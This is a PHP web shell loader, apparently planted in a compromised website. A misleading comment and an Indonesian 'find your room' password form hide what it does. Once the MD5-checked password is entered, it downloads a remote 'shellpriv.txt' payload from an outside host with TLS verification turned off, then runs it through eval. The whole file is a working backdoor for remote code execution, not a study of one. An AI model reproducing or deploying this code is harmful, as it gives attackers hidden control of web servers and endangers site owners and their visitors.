<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the Crd is submitted and correct
if (isset($_POST['Crd'])) {
    $entered_Crd = $_POST['Crd'];
    $hashed_Crd = '8bf367d35e1ea7b41c17b6aeb9301aa1';
    if (md5($entered_Crd) === $hashed_Crd) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu';
    } else {
        
        echo "Salah Kamar Kau Itu 😤, Coba Cari Kamar Kau Yang Betul";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://cloaking.unihar.ac.id/shellpriv.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cari Kamar Anda</title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="Crd">Kamar Nomor Berapa ?</label>
            <input type="password" display="none" id="Crd" name="Crd">
            <input type="submit" value="Cari">
        </form>
    </body>
    </html>
    <?php
}
?>
